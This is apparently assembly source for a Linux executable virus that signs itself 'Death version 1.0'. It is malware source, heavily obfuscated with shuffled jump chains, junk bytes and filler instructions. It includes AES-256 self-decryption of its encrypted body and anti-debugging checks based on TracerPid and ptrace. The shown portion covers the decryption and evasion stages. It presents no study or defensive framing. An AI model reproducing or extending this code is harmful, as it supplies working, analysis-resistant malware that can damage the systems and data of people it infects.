; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Death version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db ':'
    .key_preview: times 0x8 db 0x30
    db ':'
    .poly_preview: times 0x10 db 0x30
    db ':'
    .meta_preview: times 0x10 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
signature_reg_len: equ _signature.poly_preview-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
keycreation_len: equ _decrypt-_virus
encrypted_len: equ _eof-_decrypt
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    mjmp        ..@EKCw4OszfsVI
..@1aaFbktntipV:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rbx
    movr        r2, rax
    xor         r3, r3
%endif
%endif
    mjmp        ..@BTqvdITkZyrV
..@HRizXXUqa3nW:
    movdqa      xmm4, xmm1
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    pslldq      xmm4, 0x4
    push        rsi
    mjmp        ..@0pQVztgjDMlZ
..@4Uokn7brk35J:
    mjmp         DecryptExecutableCode
    mjmp        Strlen
..@snNMSHDpzZNH:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r1, rax
%endif
%endif
    mjmp        ..@LlSxg3NyZ8H6
..@FuTUDUYr55np:
    xchg        rbx, rbx
    movdqu      xmm1, OWORD [rsp+0xa0]
    aesdec      xmm0, xmm1
    mjmp        ..@p1dpxPvajty4
db 0xac
..@p1dpxPvajty4:
    mjmp        ..@ngoxSnwmGRvw
..@ngoxSnwmGRvw:
    mjmp        ..@s2gkP2rpDzi5
..@XLnd2AlxlVSA:
    or          r2, PAGE_SIZE-1
    mjmp        ..@obx0fcpFgmp7
..@87AXH4r3Sexf:
    pop         rsi
    mjmp        ..@yOm9xUixWdlp
..@yOm9xUixWdlp:
    mjmp        ..@T0SF1FOOHK24
..@IYnKY8rXaz5l:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_GETPPID
    syscall
    xchg        rcx, rcx
%endif
%endif
    mjmp        ..@1Y9ijrPMKjEP
db 0xe6, 0xce
..@1Y9ijrPMKjEP:
    mjmp        ..@snNMSHDpzZNH
Strlen:
    mjmp        ..@iaVQdakAJawI
..@Hv6Hdg957B4R:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    sub         rsp, bytes
    mov         QWORD [rsp], 0x00
    movr        r1, rax
    movr        r2, rsp
%endif
%endif
    mjmp        ..@wAr9nug4qmJT
..@NIeW31UXwSt0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r1, rax
%endif
%endif
    mjmp        ..@hdrTVqEt6sNA
..@HsTGQmhXNUUp:
    movr        rbp, rbp
    mov         r2, QWORD [r4]
    mjmp        ..@EI0KhmkN7gSa
db 0x2b, 0x47
..@EI0KhmkN7gSa:
    mjmp        ..@vV6ugPqJ3mKW
..@1irpjZjaDQuH:
    call        ..@L3bxxw1uVCTD
    mjmp        ..@XxTAUtClUvry
..@alskrpiLFlir:
    and         rsp, 0xfffffffffffffff0
    mjmp        ..@BkAfIpnBv1P1
db 0xe7, 0x16, 0xb5
..@BkAfIpnBv1P1:
    mjmp        ..@Yx0xUVdbJ69i
db 0xb7, 0x99, 0x25
..@Yx0xUVdbJ69i:
    mjmp        ..@EjbKVZDA8Db9
..@yb7oWNU1h6Bd:
    cmp         BYTE [r2], al
    mjmp        ..@rBVDr9Np00EN
..@4YvKHKP84J0o:
    jnz         ..@WLcCwl0tOhe9
    mjmp        ..@ykX3Bi1AlnZB
db 0xc0
..@ykX3Bi1AlnZB:
    mjmp        ..@PCsUCTe1ZqEF
..@2dxETUatA6Xq:
    VAR         public, entrypoint
    mjmp        ..@K58lMVjJT1K9
..@F9rM2BVAk6rU:
    ret
    mjmp        ..@L3bxxw1uVCTD
..@PiOaJnOBeubQ:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@NIeW31UXwSt0
%endif
%endif
    mjmp        ..@nADu8JLjq383
db 0xa1
..@nADu8JLjq383:
    mjmp        ..@IYnKY8rXaz5l
..@A7BBDmzH3rwF:
    mov         rdi, QWORD [rsp+3*bytes]
    mjmp        ..@lILjAqREo9WW
..@nT5DlGnDHaNm:
    rep         nop
    mjmp        ..@5307TW3r97eK
..@yQLC36DiwCMO:
    movdqu      OWORD [rsp+0x30],xmm0
    movdqu      xmm1, OWORD [rsp+0x40]
    mjmp        ..@W4v5pIKkqbUz
db 0xdf, 0x36, 0xa9
..@W4v5pIKkqbUz:
    mjmp        ..@LB4cIZCX6Jft
..@eFj5WgaK4miw:
    xchg        rax, rax
    push        rax
    pop         rax
    syscall
    mjmp        ..@KdMoCioDEqZM
..@kEJIvY3wZ3cx:
    ret
    mjmp        Strncmp
..@JPyvYhcWd8Nl:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    mjmp        ..@1xiOAhq669bO
..@1xiOAhq669bO:
    mjmp        ..@6hH4YNN4DiLN
db 0xd2, 0x3b
..@6hH4YNN4DiLN:
    mjmp        ..@TyCAyjoSXBxU
..@39NdoGMxjSmh:
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    sub         r2, non_encrypted_len
    push        rdx
    mjmp        ..@ANG9VjIkndtf
db 0xf9
..@ANG9VjIkndtf:
    mjmp        ..@WbX1TGpLZYkS
..@BK07ULWpUYPm:
    aesimc      xmm0,xmm1
    mjmp        ..@5ZHBtw3BB50B
..@TZXxA3G01VMO:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xa0],xmm0
    movdqu      xmm1, OWORD [rsp+0xb0]
    xchg        rdx, rdx
    aesimc      xmm0,xmm1
    mjmp        ..@niXesuZFHePt
..@30kKhAlxDlfc:
    xchg        rdi, rdi
    mjmp        ..@A7BBDmzH3rwF
..@50Uc8RtxKdj7:
    push        r1
    call        Strlen
    push        rcx
    mjmp        ..@6Splkd6ZVd4L
db 0x0c, 0x0b, 0xa6
..@6Splkd6ZVd4L:
    mjmp        ..@7ox6SZLNsse3
..@iaVQdakAJawI:
    push        rbx
    mjmp        ..@ZodfyJgDxLSB
db 0xce, 0x30
..@ZodfyJgDxLSB:
    mjmp        ..@nA6lG8GHYKRD
..@nA6lG8GHYKRD:
    mjmp        ..@PIxXreSYRdeA
db 0x4c, 0xb5, 0xa0
..@PIxXreSYRdeA:
    mjmp        ..@ivrww7mJJR6V
..@WBaXU3MgCEk7:
    GGLOBAL     entrypoint
    xchg        rdi, rdi
    cmp         QWORD [r5], 0x0000000000000000
    mjmp        ..@OES1EIFl706p
..@SgVefEZKTJNz:
    pop         rsi
    mjmp        ..@CcxVGqPqKd2k
db 0x92, 0x37, 0x2f
..@CcxVGqPqKd2k:
    mjmp        ..@xxI1iyx2cJpm
Strncmp:
    mjmp        ..@xdhlnGEVVXlO
..@7kRBRUevAXRK:
    syscall
    mjmp        ..@HjdFueHUHJQ2
db 0xc2
..@HjdFueHUHJQ2:
    mjmp        ..@JAhkpmlbAgZa
db 0xd7, 0xb0, 0x3b
..@JAhkpmlbAgZa:
    mjmp        ..@3CsJe9a4AcWp
db 0x9c, 0xf1
..@3CsJe9a4AcWp:
    mjmp        AntiDebugging
..@ZEZCsIdRLRCX:
    VAR         public, key
    movr        rsi, r5
    mjmp        ..@SU2vF9fuVzVE
..@SU2vF9fuVzVE:
    mjmp        ..@NU2oTwmP0KN6
db 0x22, 0xa8, 0x02
..@NU2oTwmP0KN6:
    mjmp        ..@bb4yMprv3Q5v
..@UnjjWSZiBA0g:
    call        Aes256KeyExpansion
    mjmp        ..@jDopOOxo4EAo
..@RkoUAtNrcfvk:
    movr        r2, r5
    movv        r3, keycreation_len
    push        rax
    mjmp        ..@9S6qy6psUtlq
..@IG2o0rjyH48I:
    movdqu      xmm1, OWORD [rsp+0x50]
    mjmp        ..@BK07ULWpUYPm
..@c13hz7W4OftD:
    movv        rax, SYS_FORK
    mjmp        ..@XsYXSM04ZCsy
..@NdJzKk0ToxnO:
%ifndef ENABLE_DEBUGGING
    sub         rsp, 0x1000
    VAR         public, procself
%endif
    mjmp        ..@LNAFnHKQJ42m
..@65MLnUNSRxio:
    ret
    mjmp        Aes256KeyCreation
..@eZ0T3F69v6ZT:
    sub         rsp, _AESD_OFF_size+0x100
    mjmp        ..@alskrpiLFlir
..@X2tSmJKeXTmB:
    push        rdi
    mjmp        ..@jGMOk7zwgFDJ
db 0x64
..@jGMOk7zwgFDJ:
    mjmp        ..@8nDorw1gvvbr
db 0xc8, 0xed
..@8nDorw1gvvbr:
    mjmp        ..@jOcsohRx67SE
..@YJ7b5S7UNJxM:
    add         r4, bytes
    mjmp        ..@uJXKr0WA7m0f
db 0x1c, 0xa8
..@uJXKr0WA7m0f:
    mjmp        ..@4UBevxTL60Xw
db 0x47, 0xca, 0x95
..@4UBevxTL60Xw:
    mjmp        ..@jfb0r9gmMs35
..@wj8BoETxYS42:
    movdqu      xmm1, OWORD [rsp+0x70]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x70],xmm0
    mjmp        ..@zYMKPjAd9ijT
..@zYMKPjAd9ijT:
    mjmp        ..@lYpF6FzAmGLf
..@Z3nnCn0SV9Sf:
    syscall
    cmp         eax, 0x00
    je          ..@ZEZCsIdRLRCX
    movr        rsp, rsp
    xor         r1, r1
    mjmp        ..@jbeuiciQOkmv
..@8lwSNF198NLh:
    pop         r1
    mjmp        ..@ulzPgqD73rZj
..@ulzPgqD73rZj:
    mjmp        ..@65MLnUNSRxio
..@LyMlu4ZuRHBh:
    push        r3
    mjmp        ..@2mFsMyXT91nU
db 0x34, 0x43, 0x9c
..@2mFsMyXT91nU:
    mjmp        ..@d75DXdSw3RIs
db 0x3b, 0xe7, 0x30
..@d75DXdSw3RIs:
    mjmp        ..@ilDeGenHRFSI
db 0xab
..@ilDeGenHRFSI:
    mjmp        ..@ok37DpnydYmm
..@M1nY4qV2Pcqu:
    mjmp        ..@qJu9JBrMjkgz
    mjmp        ..@Z4xxUEhUfDGJ
db 0xd1, 0x27, 0x2c
..@Z4xxUEhUfDGJ:
    mjmp        ..@yIvdO6GDGlR7
..@wAr9nug4qmJT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r3, r3
    xor         r4, r4
    movv        rax, SYS_WAIT4
    syscall
    pop         rax
%endif
%endif
    mjmp        ..@PwZ2A9S2Wcfb
..@PwZ2A9S2Wcfb:
    mjmp        ..@SSWXbZyZqvMo
..@bmS7R1BAgFVw:
    pslldq      xmm4, 0x4
    mjmp        ..@MQ7L0JYAvlga
..@MQ7L0JYAvlga:
    mjmp        ..@DXjNjzGB496Q
..@XsYXSM04ZCsy:
    syscall
    cmp         eax, 0x0
    jl          ..@oQCOraxSUYM1
    push        rax
    mjmp        ..@9YMBD0kwZEeX
..@9YMBD0kwZEeX:
    mjmp        ..@4llA5YSiZTPZ
..@rPuJJBCVguhl:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    movv        r1, 17
    movr        r2, rax
    xor         r3, r3
%endif
%endif
    mjmp        ..@x78o0TJv9nNz
..@GPPZ1z17WNcq:
    movr        rax, rax
    mjmp        ..@hrFvFHKL2yJb
db 0x4d, 0x24, 0x1f
..@hrFvFHKL2yJb:
    mjmp        ..@tARBxpG9nt1i
db 0x3f, 0x07, 0x6e
..@tARBxpG9nt1i:
    mjmp        ..@DnQGjjrNfoIa
db 0x97, 0x4c
..@DnQGjjrNfoIa:
    mjmp        ..@ZKUbCAqDkYhX
..@Qf4nBkBgRhfV:
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    jne         ..@b3ikBM41C0Kg
    xchg        rcx, rcx
    mjmp        ..@nT5DlGnDHaNm
..@d0qXOQ2wEKTY:
    add         rax, 0x20
    mjmp        ..@LpYV1COcDC9Z
..@jbeuiciQOkmv:
    call        ExitProgram
    mjmp        ..@kcfRGWSzw0y6
db 0xb1, 0xe8
..@kcfRGWSzw0y6:
    mjmp        ..@ZEZCsIdRLRCX
..@TyCAyjoSXBxU:
%ifndef ENABLE_DEBUGGING
    pop         rdi
    call        GetEnv
    test        rax, rax
%endif
    mjmp        ..@syidyrvIGtDm
..@hs0gS9ohJ9VZ:
    pop         rcx
    mjmp        ..@9N07uCJVCzYG
..@9N07uCJVCzYG:
    mjmp        ..@zpa5pNCRj2wd
db 0xc9, 0xdf
..@zpa5pNCRj2wd:
    mjmp        ..@FY9Apzb9Ymqx
..@EBs4vCVLc0sE:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
%endif
%endif
    mjmp        ..@ZolNk7COlaiD
..@qJu9JBrMjkgz:
    pop         r3
    mjmp        ..@YXsgGfFSDLuD
db 0x47, 0x45, 0x1f
..@YXsgGfFSDLuD:
    mjmp        ..@BtTkhg0YzuhH
..@K58lMVjJT1K9:
    movr        rdi, rdi
    sub         r1, QWORD [r5]
    mjmp        ..@3mfVnAYoSDYF
db 0x4f, 0x1c
..@3mfVnAYoSDYF:
    mjmp        ..@zIBZZyLbZIq0
..@Gdi6WposrP5p:
    push        rsi
    pop         rsi
    aeskeygenassist xmm2, xmm3, 0x2
    mjmp        ..@1irpjZjaDQuH
..@ZKUbCAqDkYhX:
    movdqu      [rsi+rcx], xmm0
    mjmp        ..@qcadrjQkl9Ja
db 0xe7
..@qcadrjQkl9Ja:
    mjmp        ..@jYkKu098PYiO
..@jYkKu098PYiO:
    add         rcx, 0x10
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jl          ..@oOowFp5pl1mB
    add         rsp, _AESD_OFF_size+0x100
    leave
    mjmp        ..@6UFnJdR6t1bH
db 0x46, 0x08
..@6UFnJdR6t1bH:
    mjmp        ..@VhVz46qbQKBc
..@pJyKSuoKqUvo:
%ifndef ENABLE_DEBUGGING
    movr        r1, r5
    call        GetEnv
    test        rax, rax
%endif
    mjmp        ..@Lq6ahHMG5dSy
..@FAKqI83cvJrS:
    movdqu      OWORD [rsp+0x20],xmm0
    push        rbx
    pop         rbx
    mjmp        ..@U8NAp83qAsKT
db 0xe0, 0xfc, 0xfb
..@U8NAp83qAsKT:
    mjmp        ..@1ucK0UyWEBd0
..@1ucK0UyWEBd0:
    mjmp        ..@DtCGhM60n9eM
db 0xa6, 0x1a
..@DtCGhM60n9eM:
    mjmp        ..@LZBjPEZQEdn3
..@I30hOPUZ36bn:
    push        rdi
    pop         rdi
    mjmp        ..@5IufCwM8ysUh
..@XoT7w5b01pxn:
    movv        rax, SYS_EXIT
    mjmp        ..@qssTsBQg53mO
db 0xdb
..@qssTsBQg53mO:
    mjmp        ..@7kRBRUevAXRK
..@BKu3ArEovCrl:
%ifndef ENABLE_DEBUGGING
    call        Memmem
    movr        rbp, rbp
    add         rax, tracerline_size
    cmp         WORD [rax], 0x0a30
    jne         ..@46qePee93Y4V
%endif
    mjmp        ..@6WBwG1OuhUsI
..@6WBwG1OuhUsI:
    mjmp        ..@KQO7uUGk3CNV
..@qXFFeG6DHpxQ:
    push        rax
    pop         rax
    xor         rax, rax
    mjmp        ..@ijRDJeoL6Ae9
db 0xe1
..@ijRDJeoL6Ae9:
    mjmp        ..@Egoo9FA0mQFP
..@MH7nGRwDh6nH:
    jmp         rax
    mjmp        ..@jdZFQ1QyEv1i
db 0x2a
..@jdZFQ1QyEv1i:
    mjmp        ..@46qePee93Y4V
..@9S6qy6psUtlq:
    pop         rax
    call        Aes256KeyCreation
    xor         r2, r2
    mjmp        ..@sJlRveLKO9oW
..@PRkEQ2G8c8MO:
    call        ..@9fwDTm3AWhb4
    mjmp        ..@rUqb9c2ltB2x
db 0x96, 0x34
..@rUqb9c2ltB2x:
    mjmp        ..@no7HvFPe6vKB
..@RR41MmFXrinX:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jz          ..@jJW7oxqz3j9d
%endif
%endif
    mjmp        ..@vOX2qdtvQcGc
db 0x20
..@vOX2qdtvQcGc:
    mjmp        ..@eySvRBfjDf5Y
..@PvEVzRkHHBXh:
    call        Strncmp
    mjmp        ..@uvCDsjy4cZRo
db 0x12, 0xec, 0xef
..@uvCDsjy4cZRo:
    mjmp        ..@vFCHjh6cCAUq
..@9fwDTm3AWhb4:
    pshufd      xmm2, xmm2, 0xaa
    mjmp        ..@R5vvOCvVqriJ
..@AnE4rvLME8zE:
    xor         rax, rax
    mjmp        ..@im4OYrTgegkT
..@oQCOraxSUYM1:
    movr        r1, rax
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
    movv        rax, SYS_WAIT4
    mjmp        ..@eFj5WgaK4miw
..@C9r1dSgNkASY:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    mjmp        ..@8034kPhFTluF
db 0xd9
..@8034kPhFTluF:
    mjmp        ..@7HV9yemaQxuA
..@7HV9yemaQxuA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        r1, 16
    push        rbx
%endif
%endif
    mjmp        ..@1aaFbktntipV
..@mOtxURlmUtYq:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
    xor         r5, r5
    mjmp        ..@MH7nGRwDh6nH
..@7XMVMCjf2sgG:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x10]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp]
    mjmp        ..@3ciUpBtFdOFp
..@egQMRvUN3JVq:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    add         rsp, bytes
%endif
%endif
    mjmp        ..@EBs4vCVLc0sE
..@123Np44z0cAA:
    movdqu      OWORD [rsp+0x10],xmm0
    movdqu      xmm1, OWORD [rsp+0x20]
    aesimc      xmm0,xmm1
    mjmp        ..@Ppbc4KNMqihm
db 0xe3, 0x2a, 0x16
..@Ppbc4KNMqihm:
    mjmp        ..@CM7eG3K20L7u
db 0x16, 0x62, 0xb6
..@CM7eG3K20L7u:
    mjmp        ..@FAKqI83cvJrS
..@2Hg38aIrrda1:
    jl          ..@1ZZsA9ra93oH
    mjmp        ..@R1DE8jiPy9uw
..@NEUHYsMw6qqq:
    pxor        xmm1, xmm2
    mjmp        ..@r14qfuObh3pQ
..@r14qfuObh3pQ:
    mjmp        ..@jmeRY551dcui
..@L3bxxw1uVCTD:
    pshufd      xmm2, xmm2, 0xff
    mjmp        ..@HRizXXUqa3nW
..@rBVDr9Np00EN:
    je          ..@yIvdO6GDGlR7
    sub         al, BYTE [r2]
    mjmp        ..@M1nY4qV2Pcqu
..@E44zXJGib8jj:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
%endif
    mjmp        ..@jTQsPTQuy483
db 0x45, 0xb5
..@jTQsPTQuy483:
    mjmp        ..@sXhY1YqRn0AC
..@sXhY1YqRn0AC:
    mjmp        ..@2ZAwXC5YsH6j
db 0xf1, 0x4d
..@2ZAwXC5YsH6j:
    mjmp        ..@Z7u5wJswT4eL
..@Z7u5wJswT4eL:
    mjmp        ..@UnNXzi0Dl2BI
..@OSVtYxQpa9cW:
    mov         m4, rdi
    call        AntiDebugging
    mjmp        ..@PK9l85GeftO6
db 0x0a, 0x03, 0x08
..@PK9l85GeftO6:
    mjmp        ..@k2w6tFc0Jzqv
db 0x6b, 0x0e, 0x08
..@k2w6tFc0Jzqv:
    mjmp        ..@42JJfyA34af2
db 0x9c, 0xb1
..@42JJfyA34af2:
    mjmp        ExitProgram
..@G6iTsSuvty1S:
    movdqa      OWORD [rsi], xmm1
    mjmp        ..@gXTpXFzQ9YH0
db 0x97, 0x42
..@gXTpXFzQ9YH0:
    mjmp        ..@6EOh6swoVSSi
..@3JsKXshvX8UX:
    cmp         QWORD [rdi], 0x00
    mjmp        ..@HlqjZISlhrOq
db 0xc8, 0x41, 0x43
..@HlqjZISlhrOq:
    mjmp        ..@JclmyuMjvr6p
..@LlSxg3NyZ8H6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r2, r2
    push        rcx
    pop         rcx
    xor         r3, r3
%endif
%endif
    mjmp        ..@5vqQeeSli8hV
db 0x0b
..@5vqQeeSli8hV:
    mjmp        ..@E8do7gZxUwJu
..@LNAFnHKQJ42m:
%ifndef ENABLE_DEBUGGING
    OFILE       [r5], 0x0
    cmp         eax, 0x3
%endif
    mjmp        ..@38sorhuLUyM1
db 0xdc, 0x07, 0x3f
..@38sorhuLUyM1:
    mjmp        ..@YdfQ63RTgkQ0
..@no7HvFPe6vKB:
    movdqa      OWORD [rsi+0xb0], xmm3
    aeskeygenassist xmm2, xmm3, 0x20
    mjmp        ..@Pasxe3Ttqqrf
db 0xe7, 0xff, 0x96
..@Pasxe3Ttqqrf:
    mjmp        ..@IAAUD5bzbNmU
..@IAAUD5bzbNmU:
    mjmp        ..@8bdjkEC9ewL4
..@jmeRY551dcui:
    movr        rsi, rsi
    mjmp        ..@XEBVgFp2TJJ2
..@hdrTVqEt6sNA:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    call        ExitProgram
%endif
%endif
    mjmp        ..@rpflIYjald48
..@ORT0AXzuOoqG:
    movr        rsp, rsp
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x50]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x40]
    mjmp        ..@ePtBe6eH52jJ
db 0xdd
..@ePtBe6eH52jJ:
    mjmp        ..@JrA2EBwTSFVP
AntiDebugging:
    mjmp        ..@UNwUCuFJehS3
..@KzvAobRPLrUn:
    pxor        xmm3, xmm4
    mjmp        ..@tdvXsOT3vCRd
..@niXesuZFHePt:
    movr        rsp, rsp
    mjmp        ..@r45FNepIVO3U
db 0xca, 0x39
..@r45FNepIVO3U:
    mjmp        ..@2Ecnuh0LGWIR
..@p6CDi27gL0Jh:
    add         r2, 1
    dec         r3
    mjmp        ..@A64feVK7TByy
db 0xa9, 0x41, 0x92
..@A64feVK7TByy:
    mjmp        ..@SsNQnvlZYPEC
..@SsNQnvlZYPEC:
    mjmp        ..@4YvKHKP84J0o
..@Vv0M4qLtDDDW:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_PTRACE
    xchg        rsp, rsp
    push        rsi
    pop         rsi
%endif
%endif
    mjmp        ..@8WPKOgo8jAfH
db 0x45, 0x1d
..@8WPKOgo8jAfH:
    mjmp        ..@ON25FhoCmuzl
..@uiTUqka3tBry:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    cmp         rax, 0x00
    jle         ..@NIeW31UXwSt0
    movr        rsp, rsp
    xchg        rsp, rsp
    movv        rax, SYS_GETPPID
%endif
%endif
    mjmp        ..@vV9KhuIxa2du
db 0x6f, 0x13, 0x6b
..@vV9KhuIxa2du:
    mjmp        ..@rPuJJBCVguhl
..@vV6ugPqJ3mKW:
    xchg        rsp, rsp
    test        r2, r2
    push        rdx
    pop         rdx
    jz          ..@Z8fkG9aoSgOY
    mjmp        ..@PvEVzRkHHBXh
DecryptExecutableCode:
    mjmp        ..@Qf4nBkBgRhfV
..@6YVFPlDgrv7i:
    aeskeygenassist xmm2, xmm3, 0x1
    push        rsi
    pop         rsi
    call        ..@L3bxxw1uVCTD
    movdqa      OWORD [rsi+0x20], xmm1
    mjmp        ..@M1bF0cf4q1ju
..@anHYMdZPFQi8:
    pxor        xmm0, xmm2
    mjmp        ..@vQU5q486t0HA
db 0xfa
..@vQU5q486t0HA:
    mjmp        ..@ESBkbuWtACgv
..@0pQVztgjDMlZ:
    xchg        rax, rax
    pop         rsi
    push        rdi
    mjmp        ..@l29IA5qPWXP4
..@5dTEbWhXEEJE:
    xchg        rdx, rdx
    mjmp        ..@e93gdPvoR3kz
..@9jQkHCVvSXka:
    pop         rdi
    mjmp        ..@Ina8UwQsKQzs
..@Ina8UwQsKQzs:
    mjmp        ..@AV1jbDDm0YN0
..@dgy3Ucci84FF:
    xchg        rbx, rbx
    mjmp        ..@HsTGQmhXNUUp
..@46qePee93Y4V:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    movv        r3, debugging_size
%endif
    mjmp        ..@js054TQGX9UO
db 0xcf, 0x98
..@js054TQGX9UO:
    mjmp        ..@ljURpHgrOWTl
Memmem:
    mjmp        ..@w4WMjBY2GhST
..@Zpy1in0QQr0Q:
    movdqa      OWORD [rsi+0x60], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@XaX8SUY8k2ya
db 0x69, 0x01
..@XaX8SUY8k2ya:
    mjmp        ..@jMRMaFfNmYLi
..@skvPSofT5Vna:
    add         rdi, bytes
    mjmp        ..@TYFt1UleoNrL
db 0xd1, 0xea
..@TYFt1UleoNrL:
    mjmp        ..@OSVtYxQpa9cW
..@ybDZhXvUM2kF:
    movdqa      OWORD [rsi+0xd0], xmm3
    aeskeygenassist xmm2, xmm3, 0x40
    call        ..@L3bxxw1uVCTD
    xchg        rbx, rbx
    movdqa      OWORD [rsi+0xe0], xmm1
    mjmp        ..@rAvK1j9rORWe
db 0xe1
..@rAvK1j9rORWe:
    mjmp        ..@C2yBbJy6Hz0n
db 0x10, 0x40, 0x0a
..@C2yBbJy6Hz0n:
    mjmp        ..@F9rM2BVAk6rU
..@PCsUCTe1ZqEF:
    xor         rax, rax
    mjmp        ..@pQnkBKGaYS7s
db 0x64, 0xd8
..@pQnkBKGaYS7s:
    mjmp        ..@qJu9JBrMjkgz
..@WLcCwl0tOhe9:
    mov         al, BYTE [r1]
    mjmp        ..@oePG4Iay5xAW
db 0x10
..@oePG4Iay5xAW:
    mjmp        ..@yb7oWNU1h6Bd
..@VX4LPF6ewuS5:
    GGLOBAL     _decrypt
    movr        r1, r5
    mjmp        ..@boW2GBgJyCDC
db 0xfc
..@boW2GBgJyCDC:
    mjmp        ..@7d3s1GFfapYg
..@sJlRveLKO9oW:
    GGLOBAL     _decrypt
    movr        r1, r5
    mjmp        ..@jgaWhJUXtR62
db 0x67, 0x32
..@jgaWhJUXtR62:
    mjmp        ..@39NdoGMxjSmh
..@kdrZ2uO1dEqK:
    movdqa      OWORD [rsi+0x50], xmm3
    mjmp        ..@fwXsioLpDl0F
db 0xd7
..@fwXsioLpDl0F:
    mjmp        ..@nXt0xnHSkicD
..@4tsdug9uTZOS:
    pop         rdi
    push        rsi
    pop         rsi
    movr        rdi, rdi
    pxor        xmm1, xmm4
    mjmp        ..@ISV4NUzjhzfq
db 0x00, 0x6c, 0x40
..@ISV4NUzjhzfq:
    mjmp        ..@Q4AbOtA8wKQ4
..@5EmMGo8oRmDV:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x200
    jne         ..@NIeW31UXwSt0
%endif
    mjmp        ..@pewTMMTplu68
..@gbWvknFquNO9:
    pxor        xmm0, xmm1
    xchg        rsp, rsp
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    mjmp        ..@SDAsr5YJ60W7
..@7d3s1GFfapYg:
    movv        r3, 111b
    mjmp        ..@NuwteUO91QSR
..@2arZkhXoRGyW:
    jz          ..@f4s54hjlIaCo
    mjmp        ..@wl4efdtH9ALe
db 0x08, 0x1e
..@wl4efdtH9ALe:
    mjmp        ..@GES1inz10b1i
db 0xec, 0xe3
..@GES1inz10b1i:
    mjmp        ..@oQCOraxSUYM1
..@FNJpToMI5IcX:
%ifndef ENABLE_DEBUGGING
    jnz         ..@46qePee93Y4V
%endif
    mjmp        ..@fmA07sxUPD6n
db 0x02
..@fmA07sxUPD6n:
    mjmp        ..@WeSFSQRa1kdh
db 0x42, 0x94, 0x0b
..@WeSFSQRa1kdh:
    mjmp        ..@GYxD0KP75hRP
db 0x13, 0x3c
..@GYxD0KP75hRP:
    mjmp        ..@COq2tlrCavkF
..@KQO7uUGk3CNV:
%ifndef ENABLE_DEBUGGING
    add         rsp, 0x1000
%endif
    mjmp        ..@E44zXJGib8jj
..@JrA2EBwTSFVP:
    aesdec      xmm0, xmm1
    xchg        rsp, rsp
    movdqu      xmm1, OWORD [rsp+0x30]
    mjmp        ..@x37L8m303nXw
db 0x1a, 0xcb
..@x37L8m303nXw:
    mjmp        ..@0rlewOuzOdIC
..@0rlewOuzOdIC:
    mjmp        ..@PSX2Eu9cJcaT
..@xrx1HGec5C65:
    pop         r3
    xchg        rsi, rsi
    mjmp        ..@0vfTE6JYZX5A
db 0xdc, 0xdd, 0xda
..@0vfTE6JYZX5A:
    mjmp        ..@NUhahp9Izc9R
